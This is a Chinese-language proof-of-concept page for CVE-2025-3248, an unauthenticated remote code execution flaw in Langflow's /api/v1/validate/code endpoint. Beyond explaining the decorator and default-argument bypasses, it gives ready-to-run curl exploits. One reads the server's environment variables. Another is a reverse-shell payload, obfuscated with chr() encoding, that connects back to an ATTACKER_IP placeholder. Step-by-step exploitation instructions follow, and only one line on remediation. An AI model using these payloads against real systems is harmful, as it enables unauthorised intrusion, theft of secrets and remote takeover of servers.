# Langflow 漏洞 POC

## 系统简介

Langflow 是一款开源的低代码 AI 应用构建平台，基于 Python 构建，用于创建 LLM 驱动的 AI 工作流。

---

## CVE-2025-3248 — 未认证远程代码执行（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2025-3248 |
| CVSS | 9.8 (CRITICAL) |
| 漏洞类型 | 代码注入 / 远程代码执行 |
| 认证要求 | 无需认证（Unauthenticated） |
| 影响版本 | Langflow < 1.3.0 |
| 修复版本 | 1.3.0 |
| 在野利用 | 已被 Flodrix Botnet 积极利用 |

### 漏洞原理

`/api/v1/validate/code` 端点对用户提供的 Python 代码执行 `exec()`，通过 `ast` 模块解析函数定义并使用 `compile()` + `exec()` 进行"验证"。

**关键绕过：Python 装饰器（Decorators）**

函数定义中的装饰器表达式在函数定义时立即执行，而非调用时。攻击者注入恶意装饰器即可绕过验证沙箱：

```python
@exec("malicious code here")
def foo():
    pass
```

**另一绕过方式：默认参数**

```python
def foo(cmd=exec("malicious code here")):
    pass
```

### POC — 命令执行（读取环境变量）

```bash
curl -X POST -H 'Content-Type: application/json' \
  http://target:8000/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"env\\\"))\")\ndef foo():\n  pass"}'
```

### POC — 反弹 Shell

```bash
# Payload（将 ATTACKER_IP 和 PORT 替换为实际值）
curl -X POST -H 'Content-Type: application/json' \
  http://target:8000/api/v1/validate/code \
  -d '{
    "code": "@exec(\"__import__(chr(111)+chr(115)).system(chr(98)+chr(97)+chr(115)+chr(104)+chr(32)+chr(45)+chr(105)+chr(32)+chr(62)+chr(38)+chr(47)+chr(100)+chr(101)+chr(118)+chr(47)+chr(116)+chr(99)+chr(112)+chr(47)+chr(65)+chr(84)+chr(84)+chr(65)+chr(67)+chr(75)+chr(69)+chr(82)+chr(95)+chr(73)+chr(80)+chr(47)+chr(52)+chr(52)+chr(52)+chr(52))\") \ndef foo():\n  pass"
  }'
```

### 利用步骤

1. 确认目标运行 Langflow < 1.3.0
2. 直接向 `/api/v1/validate/code` 发送 POST 请求（无需认证）
3. 在 `code` 字段中注入带有恶意装饰器的 Python 函数定义
4. 服务器执行 `exec()` 时装饰器被触发，实现任意代码执行

### 修复建议

升级至 Langflow 1.3.0 或更高版本。

### 参考资料

- [Horizon3.ai 技术分析](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [OffSec 技术博客](https://www.offsec.com/blog/cve-2025-3248/)
- [GitHub POC - EQSTLab](https://github.com/EQSTLab/CVE-2025-3248)
- [Exploit-DB #52262](https://www.exploit-db.com/exploits/52262)
- [NVD CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248)
- [Trend Micro - Flodrix Botnet](https://www.trendmicro.com/en_us/research/25/f/langflow-vulnerability-flodric-botnet.html)
